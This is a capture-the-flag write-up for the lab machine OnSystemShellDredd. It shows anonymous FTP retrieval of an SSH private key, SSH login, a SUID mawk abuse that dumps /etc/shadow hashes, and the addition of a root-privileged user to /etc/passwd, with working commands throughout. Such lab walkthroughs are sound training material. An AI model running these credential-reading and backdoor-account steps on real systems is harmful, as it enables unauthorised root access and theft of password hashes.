---
title: OnSystemShellDredd
categories: [Proving Grounds, Play]
tags: [FTP, PrivEsc, SUIDs]
image:
  path: https://miro.medium.com/v2/resize:fit:1200/1*fiNtXsFnX5MR7BPQV_wBvg.png
  alt:  OnSystemShellDredd Machine 🖥️
---


### Let’s find the IP Address first >>

```bash
IP : 192.168.222.130
```
{: .nolineno}

## Port Scan Results ➡️

![Untitled](/Vulnhub-Files/img/OnSystemShellDredd/Untitled.png)

```bash
OPEN PORTS >
21     FTP (Try Anonymous)
61000  SSH
```
{: .nolineno}

---

## FTP Enumeration ⤵️

Now Lets try Anonymous Login into the FTP port login →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/OnSystemShellDredd]
└─$ ftp 192.168.222.130 21
Connected to 192.168.222.130.
220 (vsFTPd 3.0.3)
Name (192.168.222.130:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||53806|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||53960|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||15635|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |***********************************************************************************|  1823      465.67 KiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:02 (0.86 KiB/s)
ftp>
```
{: .nolineno}

Now in this FTP session I got a private key ( `id_rsa` ) for ssh login and a username as `hannah` so lets try the ssh on port `61000` →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/monitoring]
└─$ ssh hannah@192.168.222.130 -i id_rsa -p 61000 
The authenticity of host '[192.168.222.130]:61000 ([192.168.222.130]:61000)' can not be established.
ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.222.130]:61000' (ED25519) to the list of known hosts.
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ whoami
hannah
hannah@ShellDredd:~$ id
uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
hannah@ShellDredd:~$
```
{: .nolineno}
<br>
<br>

---

<br>

## SHELL ➡️

Now when I got the shell so easily so lets find some flags first →

```bash
hannah@ShellDredd:~$ cat user.txt 
Your flag is in another file...
hannah@ShellDredd:~$ cat local.txt 
25be130d1a9ddcb79ff365b266f21a20
hannah@ShellDredd:~$
```
{: .nolineno}

Now lets check the SUIDs files for some permissions that leads me to root →

```bash
hannah@ShellDredd:/$ find / -perm -u=s -type f 2>/dev/null 
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk             <---- This will work <----
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd
hannah@ShellDredd:/$
```
{: .nolineno}

Now I have used the [GTFOBin](https://gtfobins.github.io/) site for searching the exploit →

![Untitled](/Vulnhub-Files/img/OnSystemShellDredd/Untitled%201.png)

Since I can read and write the files so lets see the /etc/shadow file for this system →

```bash
hannah@ShellDredd:/$ mawk '//' /etc/shadow
root:$6$pUGgTFAG7pM5Sy5M$SXmRNf2GSZhId7mGCsFwJ4UCweCXGKSMIO8/qDM6NsiKckV8UZeZefDYw2CL2uAEwawIufKMv/e1Q6YDyTeqp0:18656:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
systemd-timesync:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
avahi-autoipd:*:18480:0:99999:7:::
sshd:*:18480:0:99999:7:::
hannah:$6$y8GL381zxgwD7gRr$AhERcqNym1qlATj9Rl6RmYXyLoxl2q1purtp9d.tpWEJTmYOUJORrve1ohmQjJtNRfzfvcZXyzMLk89Ir/g5X.:18656:0:99999:7:::
systemd-coredump:!!:18480::::::
ftp:*:18480:0:99999:7:::
hannah@ShellDredd:/$
```
{: .nolineno}

Now I tried to decode the root password but it takes too much time so I decided to write my own user and password into the `/etc/passwd` file so lets do it now →

## **Adding user in /etc/passwd file :**

First we need to choose a password, salt it and hash the result. openssl to the rescue.

Flags:

- -`1` what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure.
- -`salt salt` string to use as salt. I choose the string salt
- `password` clear text password we would like to use.

```bash
$ openssl passwd -1 -salt salt password
$1$salt$qJH7.N4xYta3aEG/dfqo/0
```
{: .nolineno}

Now the format of this /etc/passwd file is this →

```bash
$ password_file_in_/etc/passwd_formats
`shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash`
```
{: .nolineno}

I named the user `shiv`.

Now lets add this password string directly into the `/etc/passwd` file →

```bash
hannah@ShellDredd:/$ mawk -v LFILE=/etc/passwd 'BEGIN { print "shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash" >> LFILE }'
hannah@ShellDredd:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
hannah:x:1000:1000:hannah,,,:/home/hannah:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
hannah@ShellDredd:/$
```
{: .nolineno}

Now lets switch user as `shiv` and use password as `password` →

```bash
hannah@ShellDredd:/$ su shiv
Password: 
root@ShellDredd:/# whoami
root
root@ShellDredd:/# id
uid=0(root) gid=0(root) groups=0(root)
root@ShellDredd:/# cd /root
root@ShellDredd:~# ls -al
total 28
drwx------  3 root root 4096 Jun 27 12:13 .
drwxr-xr-x 18 root root 4096 Aug  6  2020 ..
lrwxrwxrwx  1 root root    9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Jun 27 12:13 proof.txt
-rw-r--r--  1 root root   32 Jan 29  2021 root.txt
drwxr-xr-x  2 root root 4096 Jan 21  2021 .ssh
root@ShellDredd:~# cat root.txt
Your flag is in another file...
root@ShellDredd:~# cat proof.txt 
db699ce21ad954ed59bd0f2d91062c80
root@ShellDredd:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ba:5a:ec brd ff:ff:ff:ff:ff:ff
    inet 192.168.222.130/24 brd 192.168.222.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feba:5aec/64 scope link 
       valid_lft forever preferred_lft forever
root@ShellDredd:~#
```
{: .nolineno}
<br>

---

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }